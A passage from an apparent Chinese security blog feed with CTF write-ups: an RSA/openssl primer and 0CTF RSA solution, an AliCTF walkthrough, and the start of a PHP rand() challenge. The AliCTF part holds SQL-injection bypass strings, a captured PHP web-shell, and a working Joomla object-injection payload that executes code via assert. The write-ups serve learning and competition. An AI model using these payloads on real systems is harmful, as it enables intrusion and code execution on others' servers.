<li>然后通过随机数生成方法随机出一个e，必须满足两个条件<blockquote>
<p>$1 &lt; e &lt; \phi(N)$ 还有 e和$\phi(n)$为互质数</p>
</blockquote>
</li>
<li>再随机出一个d, 为e的模反元素<blockquote>
<p>$e * d \% \phi(N) = 1$</p>
</blockquote>
</li>
</ul>
<p>好了，三个值求出来了，现在来看看加解密<br>加解密都是对字符的二进制进行计算<br>假设明文是字符串<code>mingwen</code>则被加密的<br>$m = 0b01101101011010010110111001100111011101110110010101101110 = 30796695364658542$ </p>
<h3 id="加密">加密</h3><p>加密公式：密文$c \equiv m^e \% N$</p>
<h3 id="解密">解密</h3><p>解密公式：明文$m \equiv c^d \% N$</p>
<p>由于明文和密文的长度皆小于N，所以上面的加密解密公式可以变成：<br>$c = m^e \% N$<br>$m = c^d \% N$</p>
<h3 id="openssl简单用法小记">openssl简单用法小记</h3><p>再来用openssl来生成个公钥私钥对</p>
<h4 id="先生成私钥">先生成私钥</h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ openssl genrsa <span class="attribute">-out</span> <span class="keyword">private</span><span class="built_in">.</span>pem <span class="number">1024</span></span><br><span class="line">Generating RSA <span class="keyword">private</span> key, <span class="number">1024</span> bit long modulus</span><br><span class="line"><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.</span><span class="subst">++++++</span></span><br><span class="line"><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">..</span><span class="subst">++++++</span></span><br><span class="line">e is <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br></pre></td></tr></table></figure>
<p>这里的e就是上面计算中的e，1024为上面计算中N的bits长度<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat <span class="keyword">private</span>.pem </span><br><span class="line">-----BEGIN RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">-----<span class="keyword">END</span> RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure></p>
<p>这就是私钥</p>
<h4 id="再生成公钥">再生成公钥</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">private</span>.pem -pubout -out <span class="keyword">public</span>.pem</span><br><span class="line">writing RSA <span class="keyword">key</span></span><br><span class="line">$ cat <span class="keyword">public</span>.pem </span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">-----<span class="keyword">END</span> <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure>
<h4 id="查看密钥信息">查看密钥信息</h4><p>查看公钥信息<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">public</span>.pem -pubin -<span class="keyword">text</span></span><br><span class="line"><span class="keyword">Public</span>-<span class="keyword">Key</span>: (<span class="number">1024</span> bit)</span><br><span class="line">Modulus:</span><br><span class="line">    xxxxxxxxxxxxx</span><br><span class="line">Exponent: <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line">writing RSA <span class="keyword">key</span></span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br><span class="line">xxxxxxxxxxxx</span><br><span class="line">-----<span class="keyword">END</span> <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure></p>
<p>Modulus就是上面计算过程中的N，e为0x10001<br>查看私钥信息<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">private</span>.pem -text</span><br><span class="line">Private-<span class="string">Key:</span> (<span class="number">1024</span> bit)</span><br><span class="line"><span class="string">modulus:</span></span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line"><span class="string">publicExponent:</span> <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line"><span class="string">privateExponent:</span></span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line"><span class="string">prime1:</span></span><br><span class="line">    xxxxxxxxxxxxxx</span><br><span class="line"><span class="string">prime2:</span></span><br><span class="line">    xxxxxxxxxxxx</span><br><span class="line"><span class="string">exponent1:</span></span><br><span class="line">    xxxxxxxxxxxx</span><br><span class="line"><span class="string">exponent2:</span></span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line"><span class="string">coefficient:</span></span><br><span class="line">    xxxxxxxxxx</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">xxxxxxxxxxxx</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
<p>私钥藏了所有的信息啊。。所以说如果私钥泄露了。。就GG了。。<br>$modulus = N$<br>$publicExponent = e$<br>$privateExponent = d$<br>$prime1 = p$<br>$prime2 = q$<br>$exponent1 = d \% (p-1)$<br>$exponent2 = d \% (q-1)$<br>$coefficient = q^{-1} \% p$</p>
<h1 id="RSA?">RSA?</h1><p>然后来扯0CTF的RSA?这题，首先查看公钥的信息：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">public</span>.pem -pubin -text</span><br><span class="line">Public-<span class="string">Key:</span> (<span class="number">314</span> bit)</span><br><span class="line"><span class="string">Modulus:</span></span><br><span class="line"><span class="label">    02:</span><span class="string">ca:</span><span class="string">a9:</span><span class="string">c0:</span><span class="number">9</span><span class="string">d:</span><span class="string">c1:</span><span class="number">06</span>:<span class="number">1</span><span class="string">e:</span><span class="number">50</span>:<span class="number">7</span><span class="string">e:</span><span class="number">5</span><span class="string">b:</span><span class="number">7</span><span class="string">f:</span><span class="number">39</span>:<span class="string">dd:</span><span class="string">e3:</span></span><br><span class="line"><span class="label">    45:</span><span class="number">5</span><span class="string">f:</span><span class="string">cf:</span><span class="string">e1:</span><span class="number">27</span>:<span class="string">a2:</span><span class="string">c6:</span><span class="number">9</span><span class="string">b:</span><span class="number">62</span>:<span class="number">1</span><span class="string">c:</span><span class="number">83</span>:<span class="string">fd:</span><span class="number">9</span><span class="string">d:</span><span class="number">3</span><span class="string">d:</span><span class="number">3</span><span class="string">e:</span></span><br><span class="line"><span class="label">    aa:</span><span class="number">3</span><span class="string">a:</span><span class="string">ac:</span><span class="number">42</span>:<span class="number">14</span>:<span class="number">7</span><span class="string">c:</span><span class="string">d7:</span><span class="number">18</span>:<span class="number">8</span><span class="string">c:</span><span class="number">53</span></span><br><span class="line"><span class="string">Exponent:</span> <span class="number">3</span> (<span class="number">0x3</span>)</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MEEwDQYJKoZIhvcNAQEBBQADMAAwLQIoAsqpwJ3BBh5Qflt<span class="regexp">/Od3jRV/</span>P4Seixpti</span><br><span class="line">HIP9nT0+qjqsQhR81xiMUwIBAw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p>
<p>从这里可以得到<br>$N = 0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53$<br>$e = 3$</p>
<p>然后用<a href="http://factordb.com/" target="_blank" rel="external">http://factordb.com/</a>因式分解出了三个值<br>$p = 26440615366395242196516853423447$<br>$q = 27038194053540661979045656526063$<br>$r = 32581479300404876772405716877547$</p>
<p>接下来：<br>$\phi(p*q*r) = \phi(N) = \phi(q) * \phi(p) * \phi(r) = (p-1) * (q-1) * (r-1)$<br>$\phi(N) = 2329271097867038040364127327000042742184870900536 0280557445800298810723014218767619832560713992$</p>
<p>但是这时候出问题了，上面说了e和$\phi(N)$ 要互质数，但是 $\phi(N) \% e = 0$<br>所以不能通过求d来解密密文，不过我们仍然可知<br>$$c \equiv m^3 \% N$$</p>
<p>这时候就可以用到中国剩余定理了<br>$$m^3 \equiv c \% N$$<br>$$\Downarrow$$<br>$$\begin{cases}<br>m_1^3 \equiv c \% n_1\\<br>m_2^3 \equiv c \% n_2\\<br>m_3^3 \equiv c \% n_3<br>\end{cases}$$<br>$$\Downarrow$$<br>$$m \equiv (m_1N_1d_1 + m_2N_2d_2 + m_3N_3d_3)\ mod\ N$$<br>由于m是明文，小于N，所以可以直接得出<br>$$m = (m_1N_1d_1 + m_2N_2d_2 + m_3N_3d_3)\ mod\ N$$</p>
<p>然后计算$m_1^3 \equiv c \% n1$ 可以在这个网站中进行解密<a href="http://www.wolframalpha.com/" target="_blank" rel="external">http://www.wolframalpha.com/</a></p>
<p>研究这研究了一个星期，表示心累，解密脚本看github那篇wp去吧。。撸BCTF去了。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Crypto" scheme="http://0x48.pw/tags/Crypto/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[This is AliCTF?]]></title>
    <link href="http://0x48.pw/2016/03/15/0x13/"/>
    <id>http://0x48.pw/2016/03/15/0x13/</id>
    <published>2016-03-15T00:35:30.000Z</published>
    <updated>2016-03-28T10:19:02.246Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png" alt="alictf0"></p>
<blockquote>
<p>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。<br><a id="more"></a></p>
</blockquote>
<h1 id="Step_0">Step 0</h1><p>上图中的base64解码呗。。<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">"aHR0cDovLzIxOC4yNDQuMTQzLjE5OC8="</span> <span class="string">| base64 -d</span></span><br><span class="line">http:<span class="comment">//218.244.143.198/</span></span><br></pre></td></tr></table></figure></p>
<p>打开来是一个 伪造？ 的sqlmap网站，右键查看源码， 有一坨jsfuck，太长了，这里就不贴了。。直接丢F12里面的console运行，得到：<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">218.244</span>.143.198<span class="regexp">/.svn/</span></span><br></pre></td></tr></table></figure></p>
<p>那就svn泄露呗，记得以前做过这样的题，记不清楚了，google一下，</p>
<blockquote>
<p>现实的开发环境中，强烈建议使用导出功能svn export而不是svn co。由此可能导致非常严重的问题，很多管理员直接吧svn co出来的代码直接放到web目录下。这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的“entries”文件，逐步摸清站点结构。</p>
</blockquote>
<p>所以接下来就是访问 <code>http://218.244.143.198/.svn/entries</code>, 得到<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">This is lastest <span class="keyword">version</span> SVN, <span class="keyword">U</span> know wc.<span class="keyword">db</span>?</span><br></pre></td></tr></table></figure></p>
<p>然后访问 <code>http://218.244.143.198/.svn/wc.db</code> 把这文件下下来，这文件是svn的sqlite数据库，然后装了一个这个数据库的浏览器。<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="keyword">get</span> install sqlitebrowser</span><br></pre></td></tr></table></figure></p>
<p>然后用这个打开wc.db，然后关于这个数据库的问题网上随便都搜的到，然后找到一篇wp: <a href="http://bobao.360.cn/learning/detail/129.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/129.html</a><br>发现一个页面：<code>66666/index.php</code> 不过这wp中说的源码泄露没发现，所以直接去访问看看。。</p>
<p>好了。。。这时候该问。。最短的payload的是啥？讲道理，我觉得是 <code>&#39;=&#39;</code>, 可是竟然不跟我讲道理。。。所以我觉得最短的是<code>&#39;=&#39;&#39;#</code>还有<code>&#39;||1#</code> , 然后得到<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hack <span class="keyword">it</span> <span class="built_in">to</span> make money! GoGoGo~ <span class="keyword">http</span>://<span class="number">218.244</span>.143.198/zootopia/</span><br></pre></td></tr></table></figure></p>
<p>。。这。。懵逼了一会，随便看了看默认的是啥。。。发现是一串md5: <code>d41b8265807ce33038df2b3f7aa9fb10</code><br>丢cmd5上，接出来是aliyun, 试试，(⊙v⊙)。。。。对了<br>得到一个文件:<code>c0ngrats.txt</code>, 打开来看看，得知后面还有3题，和下一题的题目地址：<code>http://218.244.143.198/static/backdoor.zip</code></p>
<h1 id="Step_1">Step 1</h1><p>下载下来解压出来是一个数据包，数据流量审计题。。关于这类的题，我觉得很蛋疼。要不然很简单，比如http这样明文传输的协议的审计，要不然再难一点，加上802.11无线协议，但是这种爆破密码就没意思了，不设密码又太简单。要不然就是很难的审计加密协议。。所以hctf的时候我就没出流量审计的题目。</p>
<p>这题呢，就属于那种就简单的把，先过滤出来http协议，然后发现第一个backdoor.php，然后整理了下这个后门的源码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">@ini_set</span>(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line"><span class="variable">@set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">@set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line">echo(<span class="string">"-&gt;|"</span>);</span><br><span class="line"><span class="variable">$D</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">"z1"</span>]);</span><br><span class="line"><span class="variable">$F</span>=<span class="variable">@opendir</span>(<span class="variable">$D</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span>==<span class="constant">NULL</span>) &#123;</span><br><span class="line">	echo(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$M</span>=<span class="constant">NULL</span>;</span><br><span class="line">	<span class="variable">$L</span>=<span class="constant">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$N</span>=<span class="variable">@readdir</span>(<span class="variable">$F</span>)) &#123;</span><br><span class="line">		<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">"/"</span>.<span class="variable">$N</span>;</span><br><span class="line">		<span class="variable">$T</span>=<span class="variable">@date</span>(<span class="string">"Y-m-d H:i:s"</span>,<span class="variable">@filemtime</span>(<span class="variable">$P</span>));</span><br><span class="line">		@<span class="variable">$E</span>=substr(base_convert(<span class="variable">@fileperms</span>(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),-<span class="number">4</span>);</span><br><span class="line">		<span class="variable">$R</span>=<span class="string">"\t"</span>.<span class="variable">$T</span>.<span class="string">"\t"</span>.<span class="variable">@filesize</span>(<span class="variable">$P</span>).<span class="string">"\t"</span>.<span class="variable">$E</span>.<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">@is_dir</span>(<span class="variable">$P</span>)) <span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">"/"</span>.<span class="variable">$R</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	echo <span class="variable">$M</span>.<span class="variable">$L</span>;</span><br><span class="line">	<span class="variable">@closedir</span>(<span class="variable">$F</span>);</span><br><span class="line">&#125;;</span><br><span class="line">echo(<span class="string">"|&lt;-"</span>);</span><br><span class="line">die(); </span><br><span class="line"><span class="prompt">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后发现ip和该题的题目链接ip一样，去试试，没有这后门文件，那就从数据包入手。右击 -&gt; Follow TCP Stream<br>得到另一个文件<code>wllm</code>, 访问得<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> data <span class="keyword">package</span> careful, you will <span class="keyword">find</span> <span class="keyword">next</span> level url , that will be a crackme</span><br></pre></td></tr></table></figure></p>
<p>所以说下一题的入口还是在数据包里。。。看着一坨的http包，好吧，继续过滤 <code>http &amp;&amp; ip.addr==218.244.143.198</code><br>然后从第四个POST包中的参数z2中得到下一题的入口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"YUhSMGNEb3ZMekl4T0M0eU5EUXVNVFF6TGpFNU9DOXpkR0YwYVdNdlkzSmhZMnR0WlE9PQ=="</span> | base64 <span class="operator">-d</span>| base64 <span class="operator">-d</span></span><br><span class="line">http://<span class="number">218.244</span>.<span class="number">143.198</span>/static/crackme</span><br></pre></td></tr></table></figure></p>
<h1 id="Step_2">Step 2</h1><p>linux64位逆向题呗。。。比Z神出的简单多了，直接丢到ida中，F5，关键部分如图所示<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf1.png" alt="alictf1"><br>payload:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crack.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">secret = [<span class="number">0x8</span>, <span class="number">0x45</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>, <span class="number">0x4b</span>, <span class="number">0x31</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x52</span>, <span class="number">0x0b</span>, <span class="number">0x16</span>, <span class="number">0x23</span>] </span><br><span class="line">secret1 = [<span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x23</span>, <span class="number">0x6b</span>, <span class="number">0x6c</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0x29</span>, <span class="number">0x6b</span>, <span class="number">0x73</span>, <span class="number">0x6b</span>]</span><br><span class="line"><span class="literal">result</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="type">range</span>(<span class="number">12</span>):</span><br><span class="line">	tmp = secret[x] ^ secret1[x] ^ <span class="number">0xF</span></span><br><span class="line">	<span class="literal">result</span> += chr(tmp)</span><br><span class="line"></span><br><span class="line"><span class="literal">result</span> += <span class="string">"a"</span></span><br><span class="line">print <span class="literal">result</span></span><br><span class="line"><span class="comment"># $ python crack.py | ./crackme</span></span><br><span class="line"><span class="comment"># I want ur password:Yes!</span></span><br><span class="line"><span class="comment"># $ python crack.py</span></span><br><span class="line"><span class="comment"># t.cn/RGRtojGa</span></span><br></pre></td></tr></table></figure></p>
<p>去掉最后的a，就是下一题的入口了</p>
<h1 id="Step_3">Step 3</h1><p><a href="http://112.124.106.246/7fbde8d70c816033/index.php" target="_blank" rel="external">http://112.124.106.246/7fbde8d70c816033/index.php</a><br>打开来一看是…..Joomla。。。。。。。。。。<br>0CTF的piapiapia那题搜关于php序列化的漏洞搜出来的全是这个博客的反序列化截断漏洞。。。。<br>然后发现这漏洞阿里云还写了分析报告，好了。。。估计就是这洞了。。。<br>payload:<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="variable">url =</span> <span class="string">"http://112.124.106.246/7fbde8d70c816033/index.php"</span></span><br><span class="line"><span class="variable">header =</span> &#123;</span><br><span class="line">	<span class="string">"X-Forwarded-For"</span>: '&#125;__test|O:<span class="number">21</span>:<span class="string">"JDatabaseDriverMysqli"</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">"fc"</span>;O:<span class="number">17</span>:<span class="string">"JSimplepieFactory"</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">21</span>:<span class="string">"\\0\\0\\0disconnectHandlers"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">9</span>:<span class="string">"SimplePie"</span>:<span class="number">5</span>:&#123;s:<span class="number">8</span>:<span class="string">"sanitize"</span>;O:<span class="number">20</span>:<span class="string">"JDatabaseDriverMysql"</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">8</span>:<span class="string">"feed_url"</span>;s:<span class="number">37</span>:<span class="string">"phpinfo();JFactory::getConfig();exit;"</span>;s:<span class="number">19</span>:<span class="string">"cache_name_function"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;s:<span class="number">5</span>:<span class="string">"cache"</span>;b:<span class="number">1</span>;s:<span class="number">11</span>:<span class="string">"cache_class"</span>;O:<span class="number">20</span>:<span class="string">"JDatabaseDriverMysql"</span>:<span class="number">0</span>:&#123;&#125;&#125;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">"init"</span>;&#125;&#125;s:<span class="number">13</span>:<span class="string">"\\0\\0\\0connection"</span>;b:<span class="number">1</span>;&#125;\xf0',</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">req =</span> requests.get(url, <span class="variable">headers=</span>header)</span><br><span class="line">print req.content</span><br><span class="line"><span class="comment"># $ python payload.py</span></span><br><span class="line"><span class="comment"># Success! key:xxxxxxxxxxxxxxxxxxxxx 发简历时附加此key有加分</span></span><br></pre></td></tr></table></figure></p>
<p>撸了两节课撸完了。。。还是继续研究0CTF去了。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png" alt="alictf0"></p>
<blockquote>
<p>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。<br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[0CTF总结]]></title>
    <link href="http://0x48.pw/2016/03/14/0x12/"/>
    <id>http://0x48.pw/2016/03/14/0x12/</id>
    <published>2016-03-14T02:25:27.000Z</published>
    <updated>2016-03-28T10:19:17.966Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
</blockquote>
<a id="more"></a>
<h1 id="rand_2">rand_2</h1><p>题目源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &amp;&amp; time() - <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &gt; <span class="number">60</span>) &#123;</span><br><span class="line">	session_destroy();</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'timeout'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'go'</span>])) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'rand'</span>] = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$i</span> = <span class="number">5</span>;</span><br><span class="line">	<span class="variable">$d</span> = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$i</span>--)&#123;</span><br><span class="line">		<span class="variable">$r</span> = (string)rand();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>][] = <span class="variable">$r</span>;</span><br><span class="line">                <span class="variable">$d</span> .= <span class="variable">$r</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> md5(<span class="variable">$d</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'check'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'check'</span>] === <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>]) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'die'</span>;</span><br><span class="line">		session_destroy();</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题看了国外的论文后知道了通过rand()随机出来的伪随机数有一个规律：<code>r[i] = r[i-3] + r[i-31]</code></p>
<p>这里有一个需要注意的地方，题目服务器是ubuntu<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php&gt; echo <span class="function"><span class="title">getrandmax</span><span class="params">()</span></span> </span><br><span class="line"><span class="number">2147483647</span></span><br></pre></td></tr></table></figure></p>
